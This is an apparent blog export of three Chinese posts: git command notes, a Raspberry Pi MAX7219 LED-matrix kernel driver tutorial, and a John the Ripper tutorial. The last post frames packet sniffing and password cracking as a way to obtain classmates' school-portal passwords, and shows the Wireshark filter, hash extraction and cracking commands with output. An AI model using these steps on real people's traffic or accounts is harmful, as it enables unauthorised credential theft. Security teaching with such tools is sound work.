doc/server/arch.txtdoc/*.txt# ignore all .pdf files in the doc/ directory and any of its subdirectoriesdoc/**/*.pdf 规则如下： 匹配符 #表示注释 !取反 /+pattern用于防止递归匹配 pattern+/用于表示目录 查看修改内容 1$ git diff [--staged|cached] 提交修改 123$ git commit [-v|s|a] [-m "message"]# -v对修改内容进行diff，打印出来# -a提交所有修改内容，不管是否已经staged 删除文件 12$ git rm [--cached] [-f]# --cached表示从staged area中删除 移动文件 1$ git mv file_from file_to 查看提交历史 123$ git log [-p] [-&lt;num&gt;] [--stat] [--pretty=&lt;format&gt;] [--graph]# -p对提交内容进行diff# --stat查看统计内容 使用git log -S symbol_name查看对该符号进行过修改的提交记录 重新提交，覆盖上一次commit 1$ git commit --amend 撤销staged状态 1$ git reset HEAD &lt;file&gt; 撤销对文件的修改 1$ git checkout -- &lt;file&gt; 打印远程仓库地址 1$ git remote -v 添加远程仓库 1$ git remote add &lt;shortname&gt; &lt;url&gt; 从远程仓库获取更新 1234$ git fetch &lt;remote-name&gt;# 不会自动和本地分支合并$ git pull &lt;remote-name&gt;# 自动fetch并和本地当前分支合并 更新远程仓库 1$ git push [remote-name] [branch-name] 检查远程仓库 1$ git remote show [remote-name] 修改/删除远程仓库名字 12$ git remote rename &lt;old-name&gt; &lt;new-name&gt;$ git remote remove &lt;remote-name&gt; 打印标签 1$ git tag [-l "v1.8.5*"] 新建标签 123456# annotated tags$ git tag -a v1.4 -m "my version 1.4"# lightweight tags$ git tag v1.4-lw$ git show v1.4 为之前的提交历史添加标签 1$ git tag -a v1.2 &lt;checksum&gt; 提交标签git push默认不会上传标签，必须显式地说明。 123$ git push origin [tagname]# or$ git push origin --tags 将工作目录切换到特定标签下 12# 需要新建一个分支$ git checkout -b version2 v2.0.0 需要注意的是，当该分支有了新的修改及提交后，原标签不会同步这一改动。 命令别名 12345$ git config --global alias.co checkout$ git config --global alias.br branch$ git config --global alias.unstage 'reset HEAD --'# use '!' to run an external command$ git config --global alias.visual '!gitk' 分支管理 创建新分支 123456git branch &lt;new_branch&gt;# orgit checkout -b &lt;new_branch&gt;# == git branch + git checkoutgit checkout -b &lt;new_branch&gt; &lt;remote&gt;/&lt;branch&gt;# 以远端分支为base 切换分支 1git checkout &lt;branch_name&gt; 查看分支历史 1git log --oneline --decorate --graph --all 删除分支 12git checkout -d/D &lt;branch_name&gt;# -D 强制删除，不会检测是否已经被合并 合并分支 12git merge &lt;branch_name&gt;# 将&lt;branch_name&gt;合并到HEAD指向的分支 解决分支合并冲突 123456# 查看冲突文件git status # 手动修改冲突内容# vim ...# 完成mergegit add &amp;&amp; git commit 列举分支 1234git branch [-v] [--merged/no-merged] [&lt;branch_name&gt;]# -v 是否显示各分支最后一次commit# --merged/no-merged 仅显示已经（或尚未）合并到当前分支的分支# &lt;branch_name&gt; 配合上一选项使用，以指定分支（而非当前分支）作为基准 列举远端分支 1234# 远端分支在本地用指针&lt;remote&gt;/&lt;branch&gt;来表示git ls-remote [remote]# orgit remote show [remote] 同步远端分支 12git fetch origin# 更新本地缓存的远端分支 更新远端分支 12345git push &lt;remote&gt; &lt;local_branch&gt;:&lt;remote_branch&gt;# 将本地的&lt;local_branch&gt;分支push到远端的&lt;remote_branch&gt;分支# orgit push &lt;remote&gt; &lt;branch&gt;# 将本地的&lt;branch&gt;分支push到远端的&lt;branch&gt;分支 缓存认证信息 12# 短时间内省去密码输入操作git config --global credential.helper cache tracking branchtracking branch是与远端分支直接对应的本地分支，进行pull操作时，git能够自动提供server地址与需要merge 的分支名。 123456git checkout -b &lt;new_branch&gt; &lt;remote&gt;/&lt;branch&gt;# orgit checkout --track &lt;remote&gt;/&lt;branch&gt;# orgit checkout &lt;new_branch&gt;# 当&lt;new_branch&gt;与本地缓存的远端分支同名时，可以自动新建一个tracking branch 修改upstream branch 12git branch -u/--set-upstream-to &lt;remote&gt;/&lt;branch&gt;# 修改当前tracking branch的upstream branch upstream branch别名当前tracking branch的upstream branch可以用@{u}、@{upstream}来表示。 1234# @&#123;u&#125;, @&#123;upstream&#125;git merge @&#123;u&#125;# orgit checkout @&#123;u&#125; 列举track关系 1git branch -vv 删除远端分支 1git push &lt;remote&gt; --delete &lt;branch&gt; rebase 12345678git rebase &lt;branch&gt;# 将当前分支rebase到&lt;branch&gt;上git rebase &lt;base_branch&gt; &lt;topic_branch&gt;# 将&lt;topic_branch&gt;分支rebase到&lt;base_branch&gt;上git rebase --onto &lt;base_branch&gt; &lt;new_branch1&gt; &lt;new_branch2&gt;# 以&lt;base_branch&gt;作为base，将&lt;new_branch2&gt;从&lt;new_branch1&gt;分叉后的所有commit重新apply一遍，具体应用见下git rebase -i &lt;commit_hash_value&gt;# 基于&lt;commit_hash_value&gt;对应的commit，对后续commit进行交互式rebase操作，用于调整git历史 初始状态rebase命令：$ git rebase --onto master server client结果： 自动rebase 12345git pull --rebase# 采用rebase，而非merge# == git fetch + git rebase &lt;remote&gt;/&lt;branch&gt;git config --global pull.rebase true# 设置默认采用rebase 注意事项Never rebase anything you’ve pushed somewhere.If you treat rebasing as a way to clean up and work with commits before you push them, and if you only rebase commits that have never been available publicly, then you’ll be fine. If you rebase commits that have already been pushed publicly, and people may have based work on those commits, then you may be in for some frustrating trouble, and the scorn of your teammates. To Be Continued]]></content>
      <tags>
        <tag>Study Notes</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手写一个简单的字符设备驱动]]></title>
    <url>%2F2016%2F06%2F10%2F%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[在嵌入式Linux中，操作GPIO并不是一件难事，我们可以通过虚拟文件系统或者其他相关库轻易地控制一个引脚的电平。不过当我们需要利用GPIO来控制一个设备时，一切就不再是那么简单了，因为控制引脚电平是一种非常low-level的原始操作，而控制设备行为是一种high-level的语义操作，这之间的巨大鸿沟显示不是普通用户所能填平的，此时就需要程序员出马了。在计算机领域有这么一句话：计算机学科的所有问题都能通过增加一层额外的抽象层来解决，上述问题也不例外，我们可以在用户与设备之间建立一个抽象层，它向用户提供浅显易懂的语义操作，而对下层设备的控制仍是通过GPIO原始操作来完成，这对用户而言是透明的，所以他们不会再因繁琐的GPIO操作而烦恼，上述问题也即得到了解决。 这里提到的抽象层正是本文将要实现的字符设备驱动程序。 设备： - Rraspberry Pi I - MAX7219驱动的8x8 LED矩阵 Start from here 预备知识 在编写设备驱动程序之前，我们需要先把底层GPIO操作打通。这里我们通过sysfs目录中的特殊文件来控制GPIO引脚。 进入/sys/class/gpio/目录，我们需要关注该目录下的两个文件，分别为export和unexport，向export文件中写入引脚编号表示启用该引脚，向unexport文件中写入引脚编号表示停用该引脚。如下所示：123456789101112131415pi@raspberrypi /sys/class/gpio $ ltotal 0-rwxrwx--- 1 root gpio 4096 Jun 4 11:17 exportlrwxrwxrwx 1 root gpio 0 Jun 4 11:17 gpiochip0 -&gt; ../../devices/soc/20200000.gpio/gpio/gpiochip0-rwxrwx--- 1 root gpio 4096 Jun 4 13:05 unexportpi@raspberrypi /sys/class/gpio $ echo 8 &gt; exportpi@raspberrypi /sys/class/gpio $ echo 10 &gt; exportpi@raspberrypi /sys/class/gpio $ ltotal 0-rwxrwx--- 1 root gpio 4096 Jun 4 13:05 exportlrwxrwxrwx 1 root gpio 0 Jun 4 13:05 gpio10 -&gt; ../../devices/soc/20200000.gpio/gpio/gpio10lrwxrwxrwx 1 root gpio 0 Jun 4 13:05 gpio8 -&gt; ../../devices/soc/20200000.gpio/gpio/gpio8lrwxrwxrwx 1 root gpio 0 Jun 4 11:17 gpiochip0 -&gt; ../../devices/soc/20200000.gpio/gpio/gpiochip0-rwxrwx--- 1 root gpio 4096 Jun 4 13:05 unexportpi@raspberrypi /sys/class/gpio $ 注意到，当我们启用GPIO8和GPIO10两个引脚时，目录下出现了两个链接文件，分别链接到两个引脚的控制目录，我们可以cd进入控制目录，对引脚进行控制：123456789101112pi@raspberrypi /sys/class/gpio $ cd gpio8pi@raspberrypi /sys/class/gpio/gpio8 $ ltotal 0-rw-r--r-- 1 root root 4096 Jun 4 13:07 active_lowlrwxrwxrwx 1 root root 0 Jun 4 13:07 device -&gt; ../../../20200000.gpio-rw-r--r-- 1 root root 4096 Jun 4 13:07 direction-rw-r--r-- 1 root root 4096 Jun 4 13:07 edgedrwxr-xr-x 2 root root 0 Jun 4 13:07 powerlrwxrwxrwx 1 root root 0 Jun 4 13:05 subsystem -&gt; ../../../../../class/gpio-rw-r--r-- 1 root root 4096 Jun 4 13:05 uevent-rw-r--r-- 1 root root 4096 Jun 4 13:07 valuepi@raspberrypi /sys/class/gpio/gpio8 $ 其中direction文件表示引脚的模式，可以通过写入in或out来将引脚改为输入模式或输出模式，value文件表示引脚当前值，在输出模式下，我们可以通过写入0或1来控制引脚电平。 以上即是操作GPIO所需要的全部预备知识，下面我们来了解一下如何驱动MAX7219芯片。 上图为MAX7219的引脚图，可以看到，主控板只需要控制三个引脚，分别为CLK、LOAD/CS以及DIN，其中CLK为时钟信号，DIN为数据串行输入，LOAD/CS为数据载入信号，它们的时序图如下所示： 根据这张时序图，我们可以总结出以下几点信息： MAX7219一次载入16位数据； 当LOAD/CS信号拉低时，芯片开始载入数据，当LOAD/CS信号拉高时，数据载入完成； DIN上的每一位数据在CLK的上升沿被锁存； 数据从最高位到最低位依次被锁存。 其中16位数据格式如下所示，注意第8位到第11位表示寄存器地址，第0位到第7位表示送入该寄存器的数值： 知道这些信息还不够，因为我们还不知道到底要送入什么数据。下面就对MAX7219芯片的内部寄存器以及各自的作用做简单介绍。 忽略0号寄存器，因为它不干任何事。1号寄存器到8号寄存器，即Digit 0到Digit 7，用于控制LED点阵的显示，具体来说，几号寄存器就控制第几列的LED，而寄存器内存放的8位数值就决定了该列LED的显示状态，举个例子，假设5号寄存器存放着0x41，那么对应到8x8 LED点阵中就以为着第5列中，第1、7行的LED被点亮，其余行的LED全部熄灭。Decode Mode寄存器用于控制数据的译码方式，我们这里不采用译码，所以将该寄存器置0即可。Intensity寄存器表示LED点阵的亮度，实践证明，为了保护眼睛，还是将这个寄存器的值调至0或1吧，否则非常刺眼。Scan Limit寄存器可以理解为有几行LED被使用，0表示只使用1行，7表示使用全部8行，所以我们将该寄存器置为7，因为我们需要使用8x8 LED点阵中的所有灯。Shutdown寄存器只有两种值，0或1，我们将其置为1，表示正常操作模式。最后的Display Test寄存器非常关键，它也只有两个值，0或1，0表示正常操作模式，而1表示显示测试模式，在显示测试模式下，所有LED都被点亮，只有将该寄存器置为0，我们才能正常控制LED的亮灭。 以上即为驱动MAX7219的所有预备知识，下面我们开始编写程序来驱动MAX7219芯片，从而控制8x8 LED点阵的图形字符显示。 通过GPIO控制LED点阵 首先，我们实现一个数据载入函数。1234567891011121314151617181920// writeData() &amp; writeByte()void writeByte(unsigned char c);void writeData(unsigned char addr, unsigned char data) &#123; write(pinCS, "0", 1); writeByte(addr); writeByte(data); // 先送地址，再送数据 write(pinCS, "1", 1);&#125;void writeByte(unsigned char c) &#123; int i; for (i = 0; i &lt; 8; i++) &#123; write(pinCLK, "0", 1); if (c &amp; 0x80) // 先送最高位 write(pinDIN, "1", 1); else write(pinDIN, "0", 1); write(pinCLK, "1", 1); // 时钟上升沿锁存数据 c &lt;&lt;= 1; // 循环左移 &#125;&#125; 结合MAX7219芯片的驱动方式，上述两个函数应该比较容易理解。实现了上述数据载入函数后，我们对MAX7219芯片的控制就变得非常容易了，直接调用writeData函数向寄存器中写数据即可。123456789101112131415161718192021222324252627282930// main()int main() &#123; pinCS = open("/sys/class/gpio/gpio8/value", O_RDWR); pinDIN = open("/sys/class/gpio/gpio10/value", O_RDWR); pinCLK = open("/sys/class/gpio/gpio11/value", O_RDWR); pinCS_MODE = open("/sys/class/gpio/gpio8/direction", O_RDWR); # GPIO8对应CS引脚 pinDIN_MODE = open("/sys/class/gpio/gpio10/direction", O_RDWR); # GPIO10对应DIN引脚 pinCLK_MODE = open("/sys/class/gpio/gpio11/direction", O_RDWR); # GPIO11对应CLK引脚 write(pinCS_MODE, "out", 3); write(pinDIN_MODE, "out", 3); write(pinCLK_MODE, "out", 3); // 改为输出模式 // 设置控制寄存器，参见预备知识 writeData(0x09, 0x00); writeData(0x0a, 0x00); writeData(0x0b, 0x07); writeData(0x0c, 0x01); writeData(0x0f, 0x00); while (1) &#123; // 输出一个'桃心' writeData(0x01, 0x00); writeData(0x02, 0x6c); writeData(0x03, 0x92); writeData(0x04, 0x82); writeData(0x05, 0x44); writeData(0x06, 0x28); writeData(0x07, 0x10); writeData(0x08, 0x00); &#125; 为了看到上述代码的运行效果，首先将MAX7219的VCC引脚连接到5V正极，GND引脚接地，CLK引脚接到树莓派板卡的GPIO11，DIN接到GPIO10，LOAD/CS引脚接到GPIO8，再利用export启用GPIO8、GPIO10、GPIO11三个引脚。编译上述代码，然后以root权限运行程序(只有root能读写direction、value文件)，当然，也可以通过chmod命令修改direction、value文件的权限，再以普通用户的身份运行程序。LED点阵显示效果如下所示： 设计字符设备驱动程序 通过前面的实验，我们应该能够熟练操作GPIO来控制LED点阵的显示了，现在我们开始为设备编写驱动程序，为用户提供更为抽象的控制接口。我们的目标是，用户能够通过write函数写入一串字符串，然后LED点阵将该字符串以每个字符停留500ms的速度依此显示。 在编写代码之前，我们需要了解一些设备驱动程序的基本知识。我们知道Linux对设备的操作是通过调用驱动程序来实现的，但驱动程序那么多，Linux怎么知道设备对应的驱动是哪个？其实，设备与驱动之间的map关系是通过一个Major number和Minor number来实现的，我们可以通过ls -l /dev查看设备的Major number和Minor number：1234pi@raspberrypi ~/Documents/Driver $ ls -l /dev/mmcblk0*brw-rw---T 1 root floppy 179, 0 Jun 4 11:17 /dev/mmcblk0 # 179为Major number 0为Minor numberbrw-rw---T 1 root floppy 179, 1 Jun 4 11:17 /dev/mmcblk0p1brw-rw---T 1 root floppy 179, 2 Jun 4 11:17 /dev/mmcblk0p2 Major number用于区分不同类型的设备，而Minor number用于区分同一类型的不同设备，所以Major number才是真正将设备和驱动map到一起的关键数。那我们怎么才能为设备驱动程序注册一个Major number呢？这里就要引入两个函数：1234// 为字符设备驱动程序注册Major numberint register_chrdev(unsigned int major,const char *name,struct file_operations *fops);// 取消之前的注册void unregister_chrdev(unsigned int major, const char *name); 我们可以通过register_chrdev这个函数来为字符设备驱动程序注册一个Major number，这个函数调用需要三个参数，分别为我们指定的Major number、设备名字以及文件操作结构，前面两个参数好理解，最后的文件操作结构又是啥呢？ 其实，file_operations这个结构就是用来指明操作设备会调用哪些函数，具体如下所示：123456static struct file_operations fops = &#123; .read = dev_read, // 读取设备时调用dev_read函数 .open = dev_open, // 打开设备时调用dev_open函数 .write = dev_write, // 写设备时调用dev_write函数 .release = dev_rls // 关闭设备时调用dev_rls函数&#125;; 此时，相信你已经对字符设备驱动程序的框架有一定的理解了，这里简单总结一下，我们需要为几个常见的文件操作，比如打开、读写以及关闭，设计对应的操作函数，使用结构file_operations存放这些函数地址，然后利用register_chrdev函数为驱动注册一个Major number，这个数不能与现有的驱动冲突(可以通过cat /proc/devices查看当前所有设备驱动的Major number)！之后我们利用mknod命令创建一个Major number相同的设备文件，当我们操作该设备文件时，Linux就会找到我们的驱动程序，并根据file_operations结构找到相应的处理函数，执行该函数来完成这次操作。明白了这些原理，接下来就是真正地代码实现了。 首先我们会遇到一个问题，register_chrdev和unregister_chrdev函数只能在内核态调用，用户态下是不可能注册驱动程序的，此时我们该怎么处理呢？有没有办法让自己的程序进入内核态运行？答案是肯定的，我们可以使用装载内核模块来实现对设备驱动程序的注册(这里我假设你已经对内核模块有一定的了解，甚至有过一些实践，如果你没有接触过内核模块，建议搜索相关资料先了解一下)，代码框架如下所示：123456789101112131415161718192021222324static struct file_operations fops = &#123; .read = dev_read, .open = dev_open, .write = dev_write, .release = dev_rls&#125;;static int dev_open(struct inode *i, struct file *f);static ssize_t dev_read(struct file *f, char *buf, size_t len, loff_t *off);static ssize_t dev_write(struct file *f, const char *buf, size_t len, loff_t *off);static int dev_rls(struct inode *i, struct file *f);int init_module(void) &#123; // 装载模块时会执行这个函数 int t = register_chrdev(218, "ledDev", &amp;fops); // 为驱动注册Major number为218 if (t &lt; 0) printk(KERN_ALERT "Device registration failed.\n"); else printk(KERN_ALERT "Device registered.\n"); return 0;&#125;void cleanup_module(void) &#123; // 卸载模块时会执行这个函数 unregister_chrdev(218, "ledDev"); printk(KERN_ALERT "Device unregistered.\n");&#125; 有了这个框架，想必你已经有一些具体的实现思路了。对于我们的LED点阵设备，我们不需要读，只需要实现写操作，而写操作在之前的GPIO控制部分中已经有所涉及，看来我们离最终的目标已经不远了。不过，还有一个严峻的问题摆在我们面前，我们之前实现的控制LED点阵显示字符涉及到了大量文件I/O，然而Linux在内核态是无法使用libc的，而且Linux Kernel开发者一再说明，永远不要在内核代码中读写文件，因为这可能会给系统带来无穷的麻烦(如果你想了解更多，请参阅这篇文档)，事实确实如此，因为我最初版本的驱动程序就直接导致了系统崩溃，后来调试过程中也多次造成了segment overflow错误。然而，本次实验对LED点阵的控制必须要通过操纵value文件来实现，我们也只好强撸一把了。这里直接贴出我设计的文件I/O函数：1234567891011121314151617181920212223242526272829struct file *openFile(const char *path) &#123; struct file *fil = NULL; mm_segment_t old_fs; printk(KERN_ALERT "&gt;&gt;&gt; openFile triggered.\n"); old_fs = get_fs(); set_fs(get_ds()); fil = filp_open(path, O_RDWR, 0664); set_fs(old_fs); return fil;&#125;static int writeFile(struct file *fil, const char *buf, size_t len) &#123; mm_segment_t old_fs; loff_t off = 0; int ret; //printk(KERN_ALERT "&gt;&gt;&gt; writeFile triggered.\n"); old_fs = get_fs(); set_fs(get_ds()); ret = vfs_write(fil, buf, len, &amp;off); set_fs(old_fs); return ret;&#125;static void closeFile(struct file *fil) &#123; printk(KERN_ALERT "&gt;&gt;&gt; closeFile triggered.\n"); filp_close(fil, NULL);&#125; 注意到，我们使用到了set_fs()来解决地址空间的不对应问题，这里我其实也没理解透，所以不敢多做解释，有兴趣的同学可以参阅这篇文档。 如上，我们实现了在内核态对文件进行读写操作的封装函数，现在可以正式写LED点阵的控制代码了！首先是打开设备文件时的操作：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// open devicestatic int dev_open(struct inode *i, struct file *f) &#123; printk(KERN_ALERT "### dev_open.\n"); exportPin(); // 启用8、10、11引脚 setDirection(); // 设置为输出模式 openPin(); // 打开value文件 pinInit(); // 初始化，设置控制寄存器 times++; printk(KERN_ALERT "Device opened %d times\n", times); return 0;&#125;static void exportPin(void) &#123; struct file *f; printk(KERN_ALERT "Start export pin.\n"); f = openFile("/sys/class/gpio/export"); if (f == NULL) &#123; printk(KERN_ALERT "Cannot open /sys/class/gpio/export\n"); return; &#125; writeFile(f, "8", 1); writeFile(f, "10", 2); writeFile(f, "11", 2); closeFile(f);&#125;static void setDirection(void) &#123; struct file *f; printk(KERN_ALERT "Start set direction.\n"); f = openFile("/sys/class/gpio/gpio8/direction"); if (f == NULL) &#123; printk(KERN_ALERT "Cannot open /sys/class/gpio/gpio8/direction.\n"); return; &#125; writeFile(f, "out", 3); closeFile(f); // 这里省去对gpio10、gpio11的设置，因为和gpio8设置完全一样&#125;static void openPin(void) &#123; printk(KERN_ALERT "Start open pin.\n"); pinCS = openFile("/sys/class/gpio/gpio8/value"); pinDIN = openFile("/sys/class/gpio/gpio10/value"); pinCLK = openFile("/sys/class/gpio/gpio11/value");&#125;static void pinInit(void) &#123; printk(KERN_ALERT "Start init pin.\n"); __writeData(0x09, 0x00); __writeData(0x0a, 0x00); __writeData(0x0b, 0x07); __writeData(0x0c, 0x01); __writeData(0x0f, 0x00);&#125; 这部分和之前通过GPIO操作LED点阵的步骤基本一致，应该不难理解。最后还剩一个关键的工作——写设备，即向设备写入字符串，然后控制LED点阵依次显示各个字符，每个字符停留500ms：1234567891011121314151617181920212223242526272829303132333435363738394041static ssize_t dev_write(struct file *f, const char *buf, size_t len, loff_t *off) &#123; printk(KERN_ALERT "### dev_write.\n"); writeString(buf, len); return 1;&#125;static void writeString(const char *str, size_t len) &#123; int i; for (i = 0; i &lt; len; i++) &#123; writeChar(0xFF); set_current_state(TASK_INTERRUPTIBLE); // 设置为可中断切换 schedule_timeout(0.05*HZ); // 50ms writeChar(str[i]); set_current_state(TASK_INTERRUPTIBLE); schedule_timeout(0.5*HZ); // 500ms &#125;&#125;static void writeChar(char c) &#123; int i; for (i = 0; i &lt; 8; i++) &#123; // 采用CP437字体，这里不贴出字体映射表，直接提供下载 __writeData(i+1, font[(unsigned int)c][i]); // 这里的__writeData等同于前面设计的writeData &#125;&#125;static void __writeData(unsigned char addr, unsigned char b) &#123; writeFile(pinCS, "0", 1); __writeByte(addr); __writeByte(b); writeFile(pinCS, "1", 1);&#125;static void __writeByte(unsigned char b) &#123; int i; for (i = 0; i &lt; 8; i++) &#123; writeFile(pinCLK, "0", 1); if (b &amp; 0x80) writeFile(pinDIN, "1", 1); else writeFile(pinDIN, "0", 1); writeFile(pinCLK, "1", 1); b &lt;&lt;= 1; &#125;&#125; 注意到，我们在输出字符串时，为每个字符分配了500ms的停留时长，这里用到了schedule_timeout这个函数，它配合前面的set_current_state(TASK_INTERRUPTIBLE)可以实现500ms的延时，同时，在这段延时过程中，进程可以被中断，防止write函数独占CPU。(点击这里下载字体映射表，将font变量移植到驱动程序代码中) 最后贴出Makefile文件：123456# 代码文件名为leddev.cobj-m += leddev.oall: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modulesclean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean 编译完成后，装载内核模块，然后直接使用libc函数open、write对设备文件进行读写测试，这里我输出了Hello, World!字符串，如下所示(若无法观看动态图，请点击链接)： 之前的设计中，我们将字符串分解成多个字符，其中每个字符停留500ms，依次显示，这样能够较为明显地表现出一个字符串。然而，我认为这种停顿输出的表现形式仍不够直观，滚动输出才最适合字符串，查阅资料可以发现，网上其他人对于LED点阵的实现也大多都是基于滚动输出的，因为这样的呈现效果更为直接、美观。下面，我们就对前面的设计进行简单修改，使其能够支持字符串的滚动输出。 如果你对我的驱动程序框架比较熟悉，那么你会发现，我们仅需要对writeChar和writeString两个函数进行简单修改，即可替换字符串输出模式。这里直接贴代码：1234567891011121314151617181920212223242526272829static void writeChar(char c, int start, int offset) &#123; for (; offset &lt; 8 &amp;&amp; start &lt; 8;) &#123; __writeData(++offset, font[(unsigned int)c][start++]); &#125;&#125;static void writeString(const char *str, size_t len) &#123; int i = 0, j = 0; while (i &lt; len + 1) &#123; if (i == 0) &#123; writeChar(0xFF, j, 0); // 先输出空白字符 writeChar(str[0], 0, 8-j); // 逐步滚入第一个字符 &#125; else if (i &lt; len) &#123; writeChar(str[i-1], j, 0); // 前一个字符持续左移，改变的是字体起始列号 writeChar(str[i], 0, 8-j); // 后一个字符跟进，改变的是LED点阵偏移列号 &#125; else if (i == len) &#123; writeChar(str[i-1], j, 0); // 最后一个字符滚出 writeChar(0xFF, 0, 8-j); // 补上空白字符 &#125; j++; if (j == 9) &#123; i++; j = 1; &#125; set_current_state(TASK_INTERRUPTIBLE); schedule_timeout(0.1*HZ); // 每过0.1秒更新一次 &#125;&#125; 修改后的两个函数逻辑变得更加复杂了，可能有些难以理解，我简单解释一下。首先是writeChar函数，此时它会接收三个参数，分别是显示字符、起始位置、偏移位置。我们知道，字体和LED点阵其实都是8x8的矩阵，这里的起始位置start表示的就是显示字符字体的起始列号，而偏移位置表示的是LED点阵的偏移列号。用实际例子来解释更为直观：对于传入参数c = &#39;a&#39;, start = 3, offset = 4，此时writeChar函数的行为就是从LED点阵的第5(offset+1)列输出字符&#39;a&#39;对应字体的第3(start)列，同理LED点阵第6列输出字体的第4列，以此类推，直到LED点阵列号超过8或者字体列号超过7时才停止输出，而对于LED点阵前面四列，我们这里不做处理。可能有人不理解为什么offset对应的是++offset，而start对应的是start++，这里解释一下：LED点阵列号是从1开始计数，字体列号从0开始计数，而我们希望它们对外全部表现为从0开始计数，所以传入的offset需要先加1才能作为真正的LED点阵列号。 有了writeChar的实现，我们写writeString就简单多了，仅仅需要处理好两个字符的同时显示。我的设计目标是，先输出空白字符0xFF，然后字符串的各个字符依次滚动进入，直到最后一个字符全部离开LED点阵才停止输出。总共实现分为三步，代码上有简单的注释，我觉得这里很难讲清所有细节，比如为什么j == 9时才会让它复位为1，为什么不复位为0，为什么点阵偏移列号是8-j而不是其他数… …如果你真的想理解这些细节问题，建议用笔在纸上模拟一下字符的滚动，然后理解一下writeChar函数，相信你能很快将writeString滚动输出的设计细节弄清楚。 最后，贴上字符串滚动输出的显示效果(若无法观看动态图，请点击链接)： Reference 课程提供的资料(包含中英文版的datasheet以及参考代码) Writing a Linux character Device Driver The Linux Kernel Module Programming Guide Max7219 Wheel in Python Linux Device Drivers, 2nd Edition Driving Me Nuts - Things You Never Should Do in the Kernel How to read/write files within a Linux kernel module]]></content>
      <tags>
        <tag>C</tag>
        <tag>Embedded</tag>
        <tag>Device Driver</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用John the Ripper破解密码]]></title>
    <url>%2F2016%2F06%2F01%2F%E4%BD%BF%E7%94%A8John-the-Ripper%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[假设这么一个场景：你和几个同学在一间教室里上课，大家都通过校园wifi上网，你想获取他们的教务网密码，于是你开始抓包，然后故意找机会让那几位同学尝试登陆教务网(这里就是社工了)，最后你根据抓到的数据包开始尝试破解登陆密码。 Start from here 假设这是你抓到的数据包: password.pcap。我们知道，即便只是一次普普通通的教务网登陆过程，其中也会涉及到很多次的信息交互，比如TCP三次握手、四次挥手，HTTP各种请求与响应等等，所以我们抓到的包中有很多是无用的，我们真正关心的是那些携带了密码的数据包，那么怎么才能找到这些包呢？ 这里涉及到HTTP协议的一些细节，我们知道HTTP有两种认证方式，分别为基本认证(Basic Authentication)和摘要认证(Digest Authentication)，具体的细节这里不展开，我们只需要知道一点，无论采用哪种认证方式，HTTP请求包头部都会带有一个Authorization的字段，对应的值即为用户名+盐+密码经过hash后的字符串。 根据这一点特征，我们可以利用Wireshark分析抓到的数据包(password.pcap)，然后在filter里填入一个简简单单的规则http contains Authorization，即可过滤出真正带有认证信息的数据包： 可以看到，仅有十个数据包通过筛选，并且从HTTP请求头部可以看出，用户身份认证采用的是基本认证的方式，而基本认证无法向传输的Credentials提供有意义的安全保护，仅仅是将其进行Base64编码。我们可以直接提取到用户密码信息，比如对于上图显示的HTTP认证包，用户Credentials即为user1:$1$foo$xxxxxxx，这里user1表示用户名，\$1表示hash类型为MD5，$foo表示采用foo作为hash的盐，最后一串字符即为密码的hash结果。我们可以将十个数据包里的所有Credentials全部提取下来，存入一个文件中，然后开始对密码进行破解。 这里我们使用John the Ripper对密码进行破解，John是一个非常强大的工具，这里不展开，直接在实践过程中介绍其用法。 下载John的源码压缩包之后，将其解压，然后根据README文档的指导直接编译安装即可。安装完成后，进入run目录，注意到该目录下有这么几个文件：john、password.lst、john.conf，其中john不用说，就是我们用来破解密码的可执行程序，password.lst是官方默认的一个密码字典，里面存放了3000多个简单密码，john.conf顾名思义就是破解密码时所用到的规则信息。 建议大家在真正使用John之前，先看一下doc目录下的各个文档，尤其是EXAMPLES和RULES两个文档，这两篇文档详细介绍了John的各种使用方法以及所有规则的含义。 将前面抓到的10条Credentials保存为文件allpasswd，首先，我们尝试最简单的破解方法：12345678~/Documents/*** ⌚ 20:36:24$ ./john --single allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Press 'q' or Ctrl-C to abort, almost any other key for statususer1 (user1)1g 0:00:00:00 100% 1.612g/s 11998p/s 11998c/s 108001C/s user21900Use the "--show" option to display all of the cracked passwords reliablySession completed 注意到，我们成功破解出了用户user1的密码，即为user1！这个是怎么破解出来的呢？其实我们这里是用到了John一个最基本的模式——Single Crack，根据官方文档的说法(It will use the login names, “GECOS” / “Full Name” fields, and users’ home directory names as candidate passwords, also with a large set of mangling rules applied)，我们知道在这种模式下，John直接将用户名等账户信息作为候选密码来进行验证，同时也支持一些mangling rules，即我们能够通过自己设计规则，来生成更多的候选密码。举个例子，假设有这么一条规则：在输入字符串的末尾添加一个字母或数字，作为新的候选密码，那么对于用户user1，根据这么一个规则，我们知道user1、user1a、user1D、user19都将成为候选密码。总的来说，Single Crack这种模式速度非常快，因为它的输入不多，仅有几条有限的用户信息，当然，相对应地，由于它的输入局限于用户账户信息，这也导致它很难破解一些与用户名完全不同的密码。最明显的，上面的实践中，我们提供了10条用户Credentials，但John只破解出了user1的密码。 既然Single Crack模式无法破解所有密码，那么我们尝试使用官方自带的字典：12345678910~/Documents/*** ⌚ 20:36:29$ ./john --wordlist=password.lst allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Remaining 9 password hashes with no different saltsPress 'q' or Ctrl-C to abort, almost any other key for statussmile (user3)admin (user2)2g 0:00:00:00 100% 5.882g/s 10429p/s 10429c/s 81617C/s notused..sssUse the "--show" option to display all of the cracked passwords reliablySession completed 我们又破解出了两个新密码！这次我们使用的是Wordlist模式，在这种模式下，John会打开我们指定的密码字典文件，将里面的所有字符串作为候选密码，一个个尝试去验证。所以说，一旦某个用户的密码在password.lst中出现了，那么这种模式就能很快地将其破解出来：1234567~/Documents/*** ⌚ 20:57:05$ grep -n '^smile$' password.lst104:smile~/Documents/*** ⌚ 20:57:20$ grep -n '^admin$' password.lst2823:admin 